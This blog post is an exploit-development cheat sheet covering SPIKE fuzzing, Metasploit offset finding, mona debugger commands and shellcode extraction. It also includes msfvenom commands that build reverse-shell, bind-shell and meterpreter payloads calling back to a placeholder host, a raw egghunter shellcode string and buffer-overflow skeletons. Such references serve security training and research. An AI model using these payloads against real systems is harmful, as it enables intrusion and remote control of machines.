---
layout: post
title: Handy Commands for Exploit Development
---

<div class="message"> 
Hey, Thought of adding few handy commands and utilities that I've been using frequently during exploit development.
</div>



### Fuzzing with SPIKE

{% highlight ruby %}

# As per given script file, it sends data to the Target-Server over TCP-Port
./generic_send_tcp <Target-IP> <Target-Port> <my-script-file.spk> 0 0

# As per given script file, it sends data to the Target-Server over UDP-Port
./gsu <Target-IP> <Target-Port> <my-script-file.spk> 0 0 5000
{% endhighlight %}

> Below is a sample script file which initially waits for one second then starts reading the lines sent by the server and sends "LOGIN user passwd" to server and again reads the reply from server.

{% highlight ruby %}

s_sleep(1)			#sleep for a second
s_readline();			#read lines from the server		
s_string("LOGIN");		#send "Login" command
s_string(" ");
s_string_variable("user");	#set "user" as first fuzz point
s_string(" ");
s_string_variable("passwd");	#set "passwd" as next fuzz point
s_string("\r\n")
s_readline();

{% endhighlight %}

> Having the application/service attached to a debugger check if the application crashes anywhere and if it does, then identify things like Crash Point, Registers you can control, Total Buffer length.

----





### Find offset using Metasploit

{% highlight ruby %}

cd /usr/share/metasploit-framework/tools/

# Creates a unique patttern of length 2000
./pattern_create -l 2000

# Find the offset which has overwritten the required registers
./pattern_offset -q PATTERN

{% endhighlight %}
----




### Handy Mona Commands while debugging 

> Download mona from <a href="https://github.com/corelan/mona"> corelan </a> and place "mona.py" file in "PyCommands" folder of immunity debugger.


{% highlight ruby %}
# set mona working folder
!mona config -set workingfolder c:\logs\%p  

# Generate unique pattern of 20000 where pc(pattern_create)
!mona pc 20000

# Finds the offset of unique or cyclic pattern in memory
!mona findmsp 

# Finds the offset of 4bytes within the pattern where po(pattern_offset)
!mona po <overwritten-bytes>

# Find instructions with jump to esp like jmp esp, call esp etc.
!mona jmp -r esp 

# Create bytearray from '00' to 'ff', used for bad character analysis
!mona bytearray 

#Generate bytearray without bad bytes "\x00\x0a\x0d"
!mona bytearray -b "\x00\x0a\x0d" 

# Generates rop gadgets from the selected Modules
!mona rop -m "kerner32,user32"

# Gives you pop pop ret to get to nseh
!mona seh 

# Analyze bytes from 001254c1
!mona compare -f C:\logs\something\bytearray.bin -a 001254c1 

#Converts given assembly instructions(sparated by "#") into opcode
!mona assemble -s "pop eax#push ebx#mov ebp,esp" 

#Find ASCII string 'w00t' in memory,  type can be 'asc', 'instr'
!mona find -type asc -s "w00t"  

#Update mona
!mona update

{% endhighlight %}
<!--###### <a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/"> more commands @ corelan</a> -->
-----





Payload Generation with MSFvenom

{% highlight ruby %}
msfvenom -l payloads
msfvenom --help-formats

msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=<UR IP> LPORT=<PORT> -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -i 2 -f python

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<UR IP> LPORT=<PORT> -e x86/shikata_ga_nai  -b '\x00\x0a\x0d' -f exe -o myshell.exe

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<UR IP> LPORT=<Port> -f raw > jspshell.jsp

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<UR IP> LPORT=<Port> -f war > myshell.war

msfvenom -p windows/shell_bind_tcp LPORT=4321 -e x86/shikata_ga_nai -b "\x00\x0d\x0a" -i 3 -f c

# where Arch(-a), Platform(- -platform), Payload(-p), encoder(-e),  Encode-Iteration(-i), Bad-chars(-b), Output Format(-f), OutPut-File(-o)
{% endhighlight %}
-----




Compiling & Extract shellcode from a Binary

{% highlight ruby %}
# Compiles and generates an object file from given nasm file where -f(output format) -o(output file)
nasm -f elf32 -o myobj.o myfile.nasm

# use "objdump" to extract the shellcode out from the generated object file "myobj.o"
objdump -d myobj.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
{% endhighlight %}
-----




EggHunter

> Basically this will loop through the memory and searches for the string “w00t"(\x77\x30\x30\x74). Once it finds the string or the egg "w00t" one after the other "w00tw00t" in memory, it will break out of the loop and continous to execute the shellcode placed immediatley after "w00tw00t".

{% highlight ruby %}
Egg "w00t" = "\x77\x30\x30\x74" 

"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
{% endhighlight %}
-----



Basic Exploit skeleton

{% highlight ruby %}
# Stack Based Overflow
buffer = junk + ret + shellcode
buffer = "A"*1340 + "B"*4 + "C"*378

# SEH Based Overflow
buffer = junk + nseh + seh + shellcode
buffer = "A"*1500 + "B"*4 + "C"*4 + "D"*554
{% endhighlight %}
-----


ARWIN Utility

> Handy program capable of extracting the address of a specific functions within a given DLL, utility can be downloaded from <a href="http://www.fuzzysecurity.com/tutorials/expDev/tools/arwin.rar">Fuzz Security</a>.

{% highlight ruby %}
# Provides the address of the function within the library
arwin <Library Name> <Function Name>
Eg: arwin Kernel32 LoadLibraryA
{% endhighlight %}
-----



